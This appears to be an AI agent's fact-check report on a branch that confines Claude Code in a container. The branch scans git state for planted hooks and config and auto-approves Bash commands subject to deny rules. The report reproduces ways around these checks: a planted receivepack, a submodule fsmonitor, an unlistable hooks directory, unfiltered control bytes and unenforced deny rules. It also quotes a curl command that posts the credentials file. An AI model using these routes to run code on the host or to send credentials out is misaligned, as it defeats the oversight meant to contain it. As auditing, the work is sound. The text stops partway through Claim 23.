Commit: ce6bee6

# Code Fact-Check Report

**Repository:** /workspace (claude-workflows), branch integrate/q076-q080
**Scope:** `git diff main...HEAD -- . ':!skills'` (pass 1) plus the commit messages of `git log main..HEAD -- . ':!skills'`; `skills/*/SKILL.md` read only as context for the F4 audit note
**Checked:** 2026-09-27
**Total claims checked:** 31 (Claim 8 split into 8a/8b)
**Summary:** 23 verified, 3 mostly accurate, 0 stale, 3 incorrect, 2 unverifiable

Execution provenance: every `executed` claim below ran as uid 1000 inside this cc-isolated container (git 2.39.5, bats 1.x), never against `/workspace` state except read-only test runs of the repo's own suites. Captured output lives under the session scratchpad, `/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad/` (abbreviated `$SP` below): logs in `$SP/r3logs/`, probe scripts `$SP/r3-probe.bats`, `$SP/r3-int.bats`, `$SP/hookprobe.sh`. They are not copied into the repo because the review rules allow writing only this report. Hallucination-pattern log read; no claim matches a logged pattern (the logged "specific measured value" class was checked against every count below, and all counts reproduce).

---

## Claim 1: ".gitignore … tracks output/*.report.md plus .stamp, .failed, .transcript.jsonl sidecars … Anything else a run might leave in output/ stays ignored."

**Location:** `.gitignore:4-12`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers files directly in `test/skills/<skill>/output/` with the four suffixes, and three non-matching names; does not establish anything for files in subdirectories of `output/` (they are ignored, which the comment does not mention but also does not contradict).
**Legibility-target:** for-orchestrator-synthesis

The rules are:

```
# .gitignore:8-12
test/skills/*/output/*
!test/skills/*/output/*.report.md
!test/skills/*/output/*.stamp
!test/skills/*/output/*.failed
!test/skills/*/output/*.transcript.jsonl
```

Command `git check-ignore -v --no-index <path>` for nine sample paths, cwd `/workspace`, 2026-09-27T21:40:50Z. `tc-x.report.md`, `.stamp`, `.failed`, `.transcript.jsonl` each matched a `!` line (not ignored). `scratch.tmp`, `tc-x.report.md.bak`, `tc-x.log` and `output/sub/tc.report.md` matched line 8 (ignored). The branch's own test `stamp: reports and every sidecar … are tracked` passed (32/32 in `test/skills/eval-helpers-freshness.bats`, `$SP/r3logs/eval-helpers-freshness.log`).

**Evidence:** `.gitignore:4-12`, `test/skills/eval-helpers-freshness.bats` (new test "reports and every sidecar"), `$SP/r3logs/gitignore-probe.log`, `$SP/r3logs/eval-helpers-freshness.log`

---

## Claim 2: "THE SCAN RUNS NOTHING FROM THE REPO. The git dir is located by plain file reads … never `git rev-parse` in the checkout. Config is read with `git config --file <f> --no-includes` from cwd /, so no repo is discovered and include.path is not followed. Hooks and info/attributes are hashed, not run. Nothing here refreshes an index"

**Location:** `devcontainer-config/cc-isolated.sh:546-551`
**Type:** Invariant / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers every command in `scan_git_dirs`, `git_exec_snapshot`, `scan_vis` and `git_exit_scan` (read in full, :567-716); does not establish that the *launcher as a whole* runs no host git in the container-written checkout — `resolve_workspace` (:216) and `ws_fingerprint` (:237-238) run `git -C "$ws" rev-parse …` and `git -C "$ws" config --get remote.origin.url` on the host at every launch, which read that config (following includes) but trigger no hook, fsmonitor or filter.
**Legibility-target:** for-orchestrator-synthesis

The only git call in the scan path is:

```bash
# devcontainer-config/cc-isolated.sh:618
    out="$(cd / && git --no-pager config --file "$f" --no-includes --get-regexp "$GIT_EXIT_SCAN_KEYS_RE")" || rc=$?
```

The git dir comes from `IFS= read -r line < "$g"` and `< "$g/commondir"` (:575, :587) and a plain `cd … && pwd -P` (:591-592); hooks and attributes go through `sha256sum <` (:651, :668). No `rev-parse`, `status`, `diff` or index command appears (paraphrased — no quote available because the claim covers absence of code; checked by reading :567-716 end to end). Executed: `bats test/cc-isolated-functions.bats`, cwd `/workspace`, 2026-09-27T21:37:00Z, exit 0, 109/109. The hook, fsmonitor, filter and include tests assert an empty `$TEST_TMPDIR/ran` marker dir after the scan (several `cd` into the repo first).

**Evidence:** `devcontainer-config/cc-isolated.sh:567-716`, `devcontainer-config/cc-isolated.sh:210-223`, `devcontainer-config/cc-isolated.sh:235-240`, `$SP/r3logs/cc-isolated-functions.log`

---

## Claim 3: "THE KEY LIST starts with install.sh's refusal list (GIT_EXEC_KEYS_RE there; a bats test pins every alternative of it into this one)"

**Location:** `devcontainer-config/cc-isolated.sh:553-554`
**Type:** Architectural / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers textual inclusion of each of install.sh's four alternatives as a whole alternative of `GIT_EXIT_SCAN_KEYS_RE`, and that the test fails closed if install.sh's regex line stops parsing; does not establish semantic equivalence beyond identical alternative text (a future install.sh alternative placed last in cc-isolated's list would false-fail the test, never false-pass).
**Legibility-target:** for-orchestrator-synthesis

```
# devcontainer-config/install.sh:207
GIT_EXEC_KEYS_RE='^(filter\.|core\.fsmonitor|include|hook\.)'
```

```
# devcontainer-config/cc-isolated.sh:565
GIT_EXIT_SCAN_KEYS_RE='^(filter\.|core\.fsmonitor|include|hook\.|core\.hookspath|…|protocol\.)'
```

The test extracts install.sh's alternatives with `sed -n "s/^GIT_EXEC_KEYS_RE='\^(\(.*\))'\$/\1/p"`, requires `[ -n "$re" ]` and `-ge 4` alternatives, then requires each as `|alt|` or `(alt|` in the scan regex (`test/cc-isolated-functions.bats:1330-1341`). It passed in the 109/109 run above.

**Evidence:** `devcontainer-config/install.sh:207`, `devcontainer-config/cc-isolated.sh:565`, `test/cc-isolated-functions.bats:1330-1341`, `$SP/r3logs/cc-isolated-functions.log`

---

## Claim 4: "plus the keys that make `git push` or an everyday host command run a program: core.hooksPath, core.sshCommand, credential helpers, pagers/editors, diff/merge drivers, gpg, aliases, submodule update commands and protocol.*"

**Location:** `devcontainer-config/cc-isolated.sh:554-557` (same claim restated at `guides/cc-isolated-usage.md:171-174` and in commit 37cae85)
**Type:** Behavioral / Configuration
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the named keys (all present in the regex) and five exec-capable settings outside it, tested on git 2.39.5; does not establish the full set of git's exec-capable settings.
**Legibility-target:** for-author

The named keys are all in `GIT_EXIT_SCAN_KEYS_RE` (`cc-isolated.sh:565`, quoted in Claim 3). But the framing, "the keys that make `git push` or an everyday host command run a program", is not complete. Two container-writable settings that the scan does not read ran a program on the host in scratch repos:

- **`remote.<name>.receivepack` on `git push`.** `remote.origin.receivepack = "touch …/ran-receivepack; git-receive-pack"` with a local-path remote left `ran-receivepack` after a plain `git push`. It still ran under the guide's recommended `git -c core.hooksPath=/dev/null -c core.fsmonitor=false push`. `remote.*` is not in the regex, so neither this key nor a repointed `remote.origin.url` is recorded.
- **A submodule's git dir under `.git/modules/<name>/` on `git status`.** `core.fsmonitor` planted in `.git/modules/sm/config` ran on a host `git status` in the superproject (`ran-sub-fsmon`). `git_exec_snapshot` reads only `$common/config` and `$gd/config.worktree`:

  ```bash
  # devcontainer-config/cc-isolated.sh:614
    for f in "$common/config" "$gd/config.worktree"; do
  ```

  So the submodule's config and hooks are not scanned. Scratch probe X4 returned status 0 after planting both.

A third probe (X6) also returned status 0 with no output for `core.attributesFile`, `difftool.x.cmd`, `mergetool.x.cmd`, `uploadpack.packObjectsHook` and `remote.origin.receivepack` planted together. Of these, only receivepack was shown to execute.

Commands: `bats $SP/r3-probe.bats`, cwd `$SP`, 2026-09-27T21:38:38Z, exit 1. X6 fails by design so that it prints its output; X4 and X5 pass, which demonstrates the gaps. The manual receivepack and submodule reproduction ran in a `mktemp -d` under `$SP`, and its output (`ran-sub-fsmon`, `ran-receivepack`) is quoted in this report's transcript.

**Evidence:** `devcontainer-config/cc-isolated.sh:554-557`, `devcontainer-config/cc-isolated.sh:565`, `devcontainer-config/cc-isolated.sh:614`, `guides/cc-isolated-usage.md:167-174`, `$SP/r3logs/r3-probe.log`, `$SP/r3-probe.bats`

---

## Claim 5: "install.sh does not need those: its own git calls never push, page or diff."

**Location:** `devcontainer-config/cc-isolated.sh:558`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers every `repo_git` call in install.sh (`rev-parse`, `cat-file`, `archive --format=tar`, `status --porcelain --ignore-submodules=all`); does not establish that `git archive` or `git status` never consult any other exec-capable key (e.g. `tar.<fmt>.command` is not reachable with `--format=tar`, by reading only).
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/install.sh:179-181
repo_git() {
  git --no-optional-locks -C "$REPO_ROOT" -c core.hooksPath=/dev/null -c core.fsmonitor=false "$@"
}
```

Call sites are `:185` (`rev-parse --verify`), `:211`/`:228` (`rev-parse --git-path`), `:266` (`cat-file -e`), `:278` (`archive --format=tar`), `:344-345` (`status --porcelain … --ignore-submodules=all`). None is push, a pager-invoking command, or diff.

**Evidence:** `devcontainer-config/install.sh:179-181`, `devcontainer-config/install.sh:185`, `devcontainer-config/install.sh:211`, `devcontainer-config/install.sh:228`, `devcontainer-config/install.sh:266`, `devcontainer-config/install.sh:278`, `devcontainer-config/install.sh:344-345`

---

## Claim 6: "scan_git_dirs <ws>: print the git dir, then the common dir, of <ws>, from plain file reads. Returns 1 when either cannot be found." (incl. relative/absolute `gitdir:`, relative commondir, symlinked `.git`)

**Location:** `devcontainer-config/cc-isolated.sh:567-594`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers absolute and relative `gitdir:` (resolved against `$ws`, as git resolves it against the `.git` file's directory), relative/absolute `commondir`, a `.git` file without a `gitdir:` line (→ 1), a repointed `.git` file, and a `.git` symlink to another repo; does not establish handling of a CRLF-terminated `gitdir:` line, which git accepts but this reader would reject (fail-safe: exit 4 / launch refusal).
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:578-593
      "gitdir: "*) g="${line#gitdir: }" ;;
      *) return 1 ;;
    esac
    case "$g" in /*) ;; *) g="$ws/$g" ;; esac
  fi
  [ -d "$g" ] || return 1
  common="$g"
  if [ -f "$g/commondir" ]; then
    line=""
    IFS= read -r line < "$g/commondir" || true
    case "$line" in /*) common="$line" ;; *) common="$g/$line" ;; esac
  fi
  # Normalise (a worktree's commondir is usually "../.."): a plain cd, no git.
  g="$(cd "$g" 2>/dev/null && pwd -P)" || return 1
  common="$(cd "$common" 2>/dev/null && pwd -P)" || return 1
  printf '%s\n%s\n' "$g" "$common"
```

The suite's linked-worktree, repointed-.git and unreadable-.git tests pass. Probe X7 (`.git` replaced by a symlink to another repo's `.git`) returned status 1 with a `gitdir` finding, because `pwd -P` resolves the link (`$SP/r3logs/r3-probe.log`).

**Evidence:** `devcontainer-config/cc-isolated.sh:567-594`, `test/cc-isolated-functions.bats` (worktree / repointed / unreadable tests), `$SP/r3logs/r3-probe.log`

---

## Claim 7: "git_exec_snapshot … Returns 1, with a reason on stderr, when the state cannot be read completely." / "Hooks: every file git could run from the default dir or a configured hooksPath."

**Location:** `devcontainer-config/cc-isolated.sh:595-598`, `devcontainer-config/cc-isolated.sh:639-641`
**Type:** Error-handling / Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers a hooks directory that git can search but the scan cannot list; does not establish behavior for every other unreadable-state shape (an unreadable hook *file* and an unreadable `.git` are correctly reported, per the suite).
**Legibility-target:** for-author

The hook loop enumerates with a glob:

```bash
# devcontainer-config/cc-isolated.sh:642-659
  for d in "${hookdirs[@]}"; do
    [ -d "$d" ] || continue
    for f in "$d"/*; do
      case "$f" in *.sample) continue ;; esac
      if [ -f "$f" ]; then
        …
      elif [ -L "$f" ]; then
        snap+="hook $f dangling -> $(readlink "$f")"$'\n'
      fi
    done
  done
```

When `$d` has search but not read permission (mode `0311`), the glob matches nothing. It stays the literal `"$d/*"`, which fails both `-f` and `-L`, so the directory is skipped silently and the function returns 0. Git runs a hook by exact path and needs only search permission.

Reproduction: a scratch repo with a local bare remote, then the baseline snapshot. Plant an executable `.git/hooks/pre-push` and `chmod 311 .git/hooks`. `git_exit_scan` printed `scan rc=0`, and the following host `git push` created `ran-prepush` (cwd a `mktemp -d` under `$SP`, 2026-09-27T21:43:31Z). So the scan neither reports "cannot be read completely" nor names a hook that git then ran. The same applies to a configured `core.hooksPath` directory. This also falsifies the guide's "names every new or changed hook" (`guides/cc-isolated-usage.md:169`).

**Evidence:** `devcontainer-config/cc-isolated.sh:595-598`, `devcontainer-config/cc-isolated.sh:639-659`, `guides/cc-isolated-usage.md:169-170`, `$SP/r3logs/unlistable-hooks.log`

---

## Claim 8a: "Control bytes in container-chosen names/values are shown as '?'" — the session-exit warning

**Location:** commit 37cae85 message; `devcontainer-config/cc-isolated.sh:673-677`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers both output blocks of `git_exit_scan` (the finding list and the could-not-read warning, which includes the snapshot's stderr reason); does not establish the launch-time path (Claim 8b).
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:675-677
scan_vis() {
  LC_ALL=C tr -c '[:print:]\n' '?'
}
```

Both `git_exit_scan` blocks end in `} | scan_vis >&2` (`:692`, `:714`). The suite's control-byte test (`core.pager less\033[2J` → `less?[2J`) passes.

**Evidence:** `devcontainer-config/cc-isolated.sh:675-677`, `devcontainer-config/cc-isolated.sh:684-716`, `$SP/r3logs/cc-isolated-functions.log`

---

## Claim 8b: "Control bytes in container-chosen names/values are shown as '?'" — the launch-time refusal

**Location:** commit 37cae85 message; `devcontainer-config/cc-isolated.sh:808-814`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the reason text that `git_exec_snapshot` prints at launch; does not establish whether any terminal in use actually acts on the bytes.
**Legibility-target:** for-author

At launch, the snapshot's stderr goes straight to the terminal. It is not piped through `scan_vis`:

```bash
# devcontainer-config/cc-isolated.sh:808-809
  local git_before=""
  if [ "$action" = "launch" ] && ! git_before="$(git_exec_snapshot "$ws")"; then
```

(excerpt ends :809; enclosing `if` continues to :814 — read: it only echoes fixed text and `exit 1`.) The reason can contain a container-chosen filename (`echo "cannot read hook $f" >&2`, `:648`). Reproduction: a hook named `x\033[2Jy` with mode 000, then `git_exec_snapshot`. `od -c` of stderr shows a raw `033 [ 2 J` in the `cannot read hook …/x\033[2Jy` line (2026-09-27T21:42:34Z). A previous session can plant such a file, so the next launch prints it unfiltered.

**Evidence:** `devcontainer-config/cc-isolated.sh:646-650`, `devcontainer-config/cc-isolated.sh:806-814`, `$SP/r3logs/launch-ctrl.log`

---

## Claim 9: "Baseline for the exit scan, taken before the container is (re)started. A repo whose .git cannot be read here could not be scanned at exit either, so refuse." / guide: "refuses to launch when the baseline snapshot cannot be taken"

**Location:** `devcontainer-config/cc-isolated.sh:806-814`; `guides/cc-isolated-usage.md:54-55`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers code order (the snapshot precedes every `devcontainer up` in `main`) and the refusal path; does not establish that the container is *stopped* when the snapshot is taken — a container left from an earlier session is still running then (the guide's "After the scan"/"Baseline" limits cover the consequence).
**Legibility-target:** for-orchestrator-synthesis

The snapshot block (`:806-814`) precedes `devcontainer up "${dc[@]}"` (`:832`) and the `--probe-only` rebuild (`:827`). On failure it prints the error and runs `exit 1` (`:813`). The suite's test `a launch refuses to start when .git cannot be snapshotted` passes (109/109).

**Evidence:** `devcontainer-config/cc-isolated.sh:806-814`, `devcontainer-config/cc-isolated.sh:825-832`, `$SP/r3logs/cc-isolated-functions.log`

---

## Claim 10: "Not `exec`: the launcher has to outlive claude to run the exit scan. The INT trap keeps a Ctrl-C that ends the session from also killing the launcher before the scan (a trapped signal, unlike an ignored one, is reset to its default in the child, so claude still gets its own Ctrl-C)."

**Location:** `devcontainer-config/cc-isolated.sh:865-872`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers SIGINT delivered to the launcher's whole process group while the child runs (child dies of SIGINT, launcher survives and scans); does not establish behavior under a real `devcontainer exec -it` TTY (raw-mode terminals send Ctrl-C as a byte, not a host SIGINT) or for SIGHUP/SIGTERM (documented as unscanned).
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:869-872
  local rc=0
  trap ':' INT
  devcontainer exec "${dc[@]}" claude || rc=$?
  trap - INT
```

`$SP/r3-int.bats` runs the launcher under `setsid`. The stubbed `claude` step plants a hook and runs `kill -INT 0`. X9 gave exit 3 (the scan ran and found the hook). X10, with nothing planted, gave exit 130 (the child's SIGINT status, passed through) (cwd `$SP`, 2026-09-27T21:39:33Z; X10 fails by design so that it prints its status).

**Evidence:** `devcontainer-config/cc-isolated.sh:865-879`, `$SP/r3logs/r3-int.log`, `$SP/r3-int.bats`

---

## Claim 11: exit codes — "exits 3 instead of 0 (4 when the exit scan cannot read .git …)"; claude's status otherwise

**Location:** `devcontainer-config/cc-isolated.sh:873-879`; commit 37cae85; `guides/cc-isolated-usage.md:50-55`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers clean (claude status passed through), finding (3 even when claude exited non-zero) and unreadable-at-exit (4); does not establish disambiguation when claude itself exits 3 or 4 (indistinguishable, not claimed otherwise).
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:874-879
  git_exit_scan "$ws" "$git_before" || scan=$?
  case "$scan" in
    0) exit "$rc" ;;
    1) exit 3 ;;   # the session planted something: never a clean exit
    *) exit 4 ;;   # the scan could not read .git
  esac
```

These are end-to-end launches with the stubbed CLI (`$SP/r3-probe.bats`, 2026-09-27T21:38:38Z). X1: clean session, claude exits 7 → 7. X2: `.git` replaced with junk → 4. X3: fsmonitor planted, claude exits 7 → 3. The suite's `a launch whose session plants a hook exits 3` also passes.

**Evidence:** `devcontainer-config/cc-isolated.sh:873-879`, `$SP/r3logs/r3-probe.log`, `$SP/r3logs/cc-isolated-functions.log`

---

## Claim 12: "Before step 4 the launcher snapshots the checkout's exec-capable `.git` state; when claude exits it compares, and exits **3** …"

**Location:** `guides/cc-isolated-usage.md:50-55`
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the ordering relative to the guide's numbered step 4 (`devcontainer up`); does not establish completeness of "exec-capable" (Claims 4, 7).
**Legibility-target:** for-orchestrator-synthesis

Step 4 is `` `devcontainer up --override-config …` `` (`guides/cc-isolated-usage.md:42`). In code, the snapshot (`cc-isolated.sh:808`) comes after `check_manifest` (step 3) and before `devcontainer up` (`:832`).

**Evidence:** `guides/cc-isolated-usage.md:42-55`, `devcontainer-config/cc-isolated.sh:796-832`

---

## Claim 13: The four documented limits — "Baseline, not audit", "After the scan", "No scan … Ctrl-C that ends the session still scans", "Outside `.git`"

**Location:** `guides/cc-isolated-usage.md:179-189` (also `devcontainer-config/cc-isolated.sh:560-564`)
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each listed limit as stated (baseline comparison via `comm -13`, no post-exit scan, SIGINT survives while SIGHUP/SIGTERM have no trap, `~/.gitconfig` and tracked files unread); does not establish that the list is complete — unlisted gaps inside `.git` exist (submodule git dirs, `remote.*.receivepack`, an unlistable hooks dir: Claims 4, 7), and the "that config is scanned" clause is split out as Claim 14.
**Legibility-target:** for-orchestrator-synthesis

The baseline limit follows from `comm -13` against the launch snapshot:

```bash
# devcontainer-config/cc-isolated.sh:694
  new="$(LC_ALL=C comm -13 <(printf '%s\n' "$before") <(printf '%s\n' "$after") | sed '/^$/d')"
```

The suite's `items present at launch are baseline` test passes. Only INT is trapped (`:870`), so HUP and TERM keep their default action. The Ctrl-C claim was executed in Claim 10.

**Evidence:** `devcontainer-config/cc-isolated.sh:560-564`, `devcontainer-config/cc-isolated.sh:694`, `devcontainer-config/cc-isolated.sh:870`, `guides/cc-isolated-usage.md:179-189`, `$SP/r3logs/r3-int.log`

---

## Claim 14: "a tracked attribute only runs a driver that config defines, and that config is scanned"

**Location:** `guides/cc-isolated-usage.md:187-189`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers driver definitions in `$common/config` and `config.worktree` (scanned under `filter.`/`diff.`/`merge.`); does not establish coverage of drivers defined in the host's `~/.gitconfig` or system config (unscanned, host-owned), nor of a submodule's `.git/modules/*/config`.
**Legibility-target:** for-author

The repo config is scanned for `filter\.|diff\.|merge\.` (`cc-isolated.sh:565`, `:614-618`). But "that config" can also be the host's global config, which the preceding sentence says is not scanned. A tracked `.gitattributes` can route files to any driver a host defines globally (e.g. `filter.lfs`). A submodule's config is not read at all (Claim 4). A precise version: "…runs a driver that some git config defines; the checkout's own config is scanned, your global config is not".

**Evidence:** `devcontainer-config/cc-isolated.sh:565`, `devcontainer-config/cc-isolated.sh:614-618`, `guides/cc-isolated-usage.md:187-189`

---

## Claim 15: Safe-push advice — "`git -c core.hooksPath=/dev/null -c core.fsmonitor=false push` … does not cover filter drivers, includes or `core.sshCommand`"

**Location:** `guides/cc-isolated-usage.md:190-193`; `devcontainer-config/cc-isolated.sh:709-711`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the enumerated exclusions (true) and one further exclusion that was executed; does not establish every exec path the `-c` form leaves open.
**Legibility-target:** for-author

The listed exclusions are correct, but the list is shorter than what the command leaves open. With both `-c` overrides, `git push` still ran a planted `remote.origin.receivepack` (`ran-receivepack`; scratch reproduction, 2026-09-27). It also does not neutralize credential helpers, `gpg.*`, `alias.*` or `protocol.*`, which the scan does name. A precise version: "covers hooks and fsmonitor only".

**Evidence:** `guides/cc-isolated-usage.md:190-193`, `devcontainer-config/cc-isolated.sh:709-711`, `$SP/r3logs/r3-probe.log`

---

## Claim 16: "the separate clone runs none of this checkout's hooks, filters or ssh settings when you push"

**Location:** `guides/cc-isolated-usage.md:193-195`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers `git fetch` from a checkout with planted `core.fsmonitor`, `core.sshCommand`, `uploadpack.packObjectsHook`, `core.pager`, `core.editor` and five hooks, then a fast-forward merge in the clean clone (no marker created); does not establish every key (e.g. a planted `.gitattributes` committed into the fetched history routes the clone's own drivers) or fetches over transports other than a local path.
**Legibility-target:** for-orchestrator-synthesis

The guide advises pushing from a separate host clone. In a scratch run, after planting the listed keys and hooks in `proj/.git`, `git -C clean fetch origin` and `merge --ff-only` left no marker (`fetch from untrusted repo: no markers`). This is consistent with the claim: pushing from the clone uses only the clone's own `.git`.

**Evidence:** `guides/cc-isolated-usage.md:190-195`, scratch run under `$SP/tmp.*` (output quoted in the session transcript: "fetch from untrusted repo: no markers")

---

## Claim 17: "It exits 4 when the exit scan cannot read `.git`" / git_exit_scan "2 when the exit state could not be read"

**Location:** `guides/cc-isolated-usage.md:54`; `devcontainer-config/cc-isolated.sh:679-693`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers a `.git` whose location cannot be resolved or whose config/hook file is unreadable; does not establish the unlistable-directory case, which returns 0 (Claim 7).
**Legibility-target:** for-orchestrator-synthesis

```bash
# devcontainer-config/cc-isolated.sh:686-693
  if ! after="$(git_exec_snapshot "$ws" 2>"$errf")"; then
    reason="$(cat "$errf")"
    rm -f "$errf"
    {
      echo "WARNING: the exit scan could not read $ws/.git: $reason"
      …
    } | scan_vis >&2
    return 2
```

(excerpt elides the two advice lines at :690-691 — read.) The suite test (status 2) passes, and so does end-to-end probe X2 (exit 4).

**Evidence:** `devcontainer-config/cc-isolated.sh:679-693`, `$SP/r3logs/r3-probe.log`

---

## Claim 18: "hooks/wiring.json carries Bash deny rules for the credentials file (Bash(*.credentials.json*))" / merged into cc-isolated settings

**Location:** `hooks/wiring.json:130`, `hooks/auto-approve-allowed-commands.sh:42-43`, commit 0864452
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the rule's presence in `wiring.json` and its idempotent merge into `settings.json` by `link-claude-home.sh`; does not establish how Claude Code itself interprets a leading-`*` Bash rule (Claim 23).
**Legibility-target:** for-orchestrator-synthesis

```
// hooks/wiring.json:128-131
  "permissions": {
    "deny": [
      "Read(/{{CLAUDE_DIR}}/.credentials.json)",
      "Bash(*.credentials.json*)",
```

`test/link-claude-home-wiring.bats` runs the linker twice and checks for exactly one copy of the rule: 16/16 passed (`$SP/r3logs/link-claude-home-wiring.log`, 2026-09-27T21:37Z).

**Evidence:** `hooks/wiring.json:128-131`, `devcontainer-config/link-claude-home.sh:150-160`, `test/link-claude-home-wiring.bats:266-275`, `$SP/r3logs/link-claude-home-wiring.log`

---

## Claim 19: "reads the Bash deny rules from the same three settings files as the allow list" and "--deny JSON  Use custom deny rules instead of reading permissions.deny from the settings files"

**Location:** `hooks/auto-approve-allowed-commands.sh:17-18`, `hooks/auto-approve-allowed-commands.sh:118-137`
**Type:** Architectural / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers path parity between `get_deny_globs` and `get_allowed_prefixes`, and `--deny` fully replacing the file read; does not establish parity with Claude Code's own settings sources (managed/enterprise settings are read by neither function), nor that `--permissions` alone disables the file deny read (it does not, by design).
**Legibility-target:** for-orchestrator-synthesis

`get_deny_globs` reads `$HOME/.claude/settings.json`, then `$git_root/.claude/settings.json` and `settings.local.json`, or the cwd `.claude/` pair when there is no git root. `get_allowed_prefixes` reads the same paths (`:164-179`). With `CUSTOM_DENY_SET`, only `$CUSTOM_DENY` is used and the function returns early (`:121-124`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:118-137`, `hooks/auto-approve-allowed-commands.sh:156-179`, `hooks/auto-approve-allowed-commands.sh:217-221`

---

## Claim 20: "this hook reads the Bash deny rules itself and falls through, never 'allow', when the raw command or any extracted command matches one" (also log 53: "never approves a match"; bare-host guide: "never approves a command that matches a `Bash(...)` deny rule")

**Location:** `hooks/auto-approve-allowed-commands.sh:45-47`; `docs/decisions/log.md:76`; `guides/bare-host-hook-wiring.md:151-153`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers `Bash(<glob>)` and legacy `Bash(<prefix>:*)` rules matched against the raw string and each extracted command; does not establish Claude Code's own rule semantics for `?`/`[`/bare `Bash` (docs not reachable here).
**Legibility-target:** for-author

The mechanism works for the wired rule and for `*`-style rules. The raw check is at `:249-254`, the per-command check at `:300-303`, and the four deny-dependent tests fail when `matches_deny` is mutated to `return 1` (Claim 26). Two kinds of Bash deny rule are not honored as written:

```bash
# hooks/auto-approve-allowed-commands.sh:106-109
deny_rules_to_globs() {
  grep -E '^Bash\(.*\)$' \
    | sed -E 's/^Bash\(//; s/\)$//; s/:\*$/*/' \
    || true
```

- A bare `Bash` deny rule (deny the whole tool) fails the `^Bash\(` filter. With `--deny '["Bash"]'`, the hook still returned `allow` for `ls -la`.
- The deny text becomes an unquoted bash glob (`:139-151`, "left unquoted on purpose"), so `[`…`]` is a character class. `--deny '["Bash(ls [x])"]'` still allowed the literal `ls [x]` (under-match). `?` over-matches, which only costs a prompt.

`$SP/hookprobe.sh`, cwd `$SP`, 2026-09-27T21:40:17Z, exit 0. The bare-host wording ("a `Bash(...)` deny rule") excludes the bare-`Bash` case, but the bracket case applies to it too.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:104-152`, `hooks/auto-approve-allowed-commands.sh:247-254`, `hooks/auto-approve-allowed-commands.sh:297-308`, `$SP/r3logs/hook-probe.log`, `$SP/hookprobe.sh`

---

## Claim 21: "Bash(X) -> X, and the legacy prefix form Bash(X:*) -> X*" and commit note "Legacy Bash(x:*) deny rules are read as globs x*, which over-matches (rm:* also covers rmdir)"

**Location:** `hooks/auto-approve-allowed-commands.sh:104-105`; commit 0864452
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the trailing `:*` conversion and the stated over-match; does not establish Claude Code's own `:*` semantics (word-boundary or not).
**Legibility-target:** for-orchestrator-synthesis

The sed `s/:\*$/*/` (`:108`) turns `rm:*` into `rm*`. The probe `rmdir x` with `--deny '["Bash(rm:*)"]'` produced no output, so the hook fell through. The suite's pipeline test (`rm -rf:*` blocks `ls | rm -rf x`) passes.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:104-110`, `$SP/r3logs/hook-probe.log`, `$SP/r3logs/auto-approve-allowed-commands.log`

---

## Claim 22: "The container has no Claude Code sandbox: bwrap and socat are not in the image, and unprivileged user namespaces are refused (`unshare -Ur` -> EPERM, measured 2026-09-27)"

**Location:** `hooks/auto-approve-allowed-commands.sh:39-41`; `docs/decisions/log.md:76`; commit 0864452
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers this cc-isolated container (`/etc/cc-config-hash` = `63fa8fc01e97ca3e`); does not establish other images or future Dockerfile changes.
**Legibility-target:** for-orchestrator-synthesis

`which bwrap socat` printed `bwrap not found` and `socat not found` (exit 1). `unshare -Ur true` printed `unshare: unshare failed: Operation not permitted` (exit 1). Run at 2026-09-27T21:40:29Z, cwd `$SP`.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:39-41`, `$SP/r3logs/sandbox-probe.log`

---

## Claim 23: "Read() rules do not cover Bash … without it `curl -d @~/.claude/.credentials.json` nested where the auto-approve hook does not look (e.g. inside $(( ))) ran with no prompt"; "a hook 'ask' overrides permissions.deny (#39344)"

**Location:** `hooks/wiring.json:38-43`; `hooks/auto-approve-allowed-commands.sh:43-45`; `docs/decisions/log.md:76`
**Type:** Behavioral / Reference
